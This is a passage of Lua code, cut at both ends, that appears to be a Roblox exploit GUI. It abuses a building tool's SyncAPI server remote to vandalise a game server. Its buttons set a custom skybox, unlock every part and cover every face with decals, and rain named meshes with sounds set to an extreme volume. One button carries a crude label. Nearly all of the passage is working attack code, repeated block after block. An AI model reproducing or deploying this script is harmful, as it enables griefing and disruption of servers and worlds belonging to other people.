		}
		_(args)
	end

	function MeshResize(part, size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end

	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = workspace.Part
			},
			[3] = stringg
		}
		_(args)
	end

	function Sky(id)
		local hrp = char:WaitForChild("HumanoidRootPart")
		local cf = hrp.CFrame
		CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)))
		for _, v in workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, 6, 0) then
				SetAnchor(true, v)
				AddMesh(v)
				SetMesh(v, "14832966960")
				SetTexture(v, id)
				MeshResize(v, Vector3.new(0, 0, 0))
			end
		end
	end

	local function createRainToads()
		while true do
			wait(0.001) -- Here they change the appearance time of the Toads or other meshes
			if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
				local hrpcf = player.Character.HumanoidRootPart.CFrame
				local x = hrpcf.x
				local z = hrpcf.z
				local randint = math.random(-600, 600)
				local randint2 = math.random(-600, 600)
				local xloc = randint + x
				local zloc = randint2 + z
				local cf = player.Character.HumanoidRootPart.CFrame.y + 400

				spawn(function()
					local newToad = CreatePart(CFrame.new(math.floor(xloc), math.random(cf, cf + 400), math.floor(zloc)))
					for i, v in game.Workspace:GetDescendants() do
						if v.Name == "Part" and v.Parent == workspace and v.CFrame.x == math.floor(xloc) and v.CFrame.z == math.floor(zloc) then
							SetName(v, "ILLUMINATI CONFIRMED?????") -- Here the name of the toad changes
							SetAnchor(false, v)
							AddMesh(v)
							Resize(v, Vector3.new(1, 1, 1), v.CFrame)
							MeshResize(v, Vector3.new(100, 100, 100))
							SetMesh(v, "108119452659897") -- Here put it A custom mesh
							SetTexture(v, "120136792901755") -- X2
							SetCollision(v, true)
							v.Orientation = Vector3.new(0, 0, 0)

							v.CFrame = v.CFrame + Vector3.new(0, 0, 0)

							local sound = Instance.new("Sound", v)
							sound.SoundId = "rbxassetid://80156405968805" -- Here the noise or another sound To the toads or other things It works when they appear 
							sound.Volume = 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
							sound.PlayOnRemove = true
							sound:Destroy()
						end
					end
				end)
			else
				wait(1)
			end
		end
	end

	coroutine.wrap(createRainToads)()

	Sky("73641250842315") -- Here they change the skybox id 
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.01, 1, 0.59, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "skybox 3"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(3600, 3600, 3600))
				SetLocked(v,true)
			end
		end
	end
	Sky("8599330683")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.20, 1, 0.59, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "decal spam 3"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("120354587062912")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.39, 1, 0.59, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "skrubify"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(3600, 3600, 3600))
				SetLocked(v,true)
			end
		end
	end
	Sky("358313209")
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("358313209")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.58, 1, 0.59, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "FUCKER"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(3600, 3600, 3600))
				SetLocked(v,true)
			end
		end
	end
	Sky("140505437279508")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.77, 1, 0.59, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "ILLMINNATI"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
